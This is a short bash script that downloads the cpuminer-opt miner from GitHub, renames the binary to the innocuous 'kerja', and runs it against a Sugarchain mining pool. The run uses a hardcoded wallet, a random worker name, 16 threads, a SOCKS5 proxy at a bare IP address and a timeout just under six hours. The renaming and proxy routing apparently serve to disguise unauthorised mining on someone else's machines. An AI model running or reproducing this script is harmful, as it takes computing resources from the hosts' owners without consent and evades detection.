#!/bin/bash
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
tar xf cpuminer-opt-linux.tar.gz
mv cpuminer-sse2 kerja
A=stratum+tcp://stratum-asia.rplant.xyz:7042
B=sugar1qdv757yc0y3gcdl35wpptenhddk60fnvns473jn
C=$(shuf -i 10-9999999999999999999 -n 1)#szor-izew
D=socks5://101.201.154.109:8080
timeout 359m ./kerja -a yespowersugar - -o $A -u $B.$C -p x -t 16 -x $D
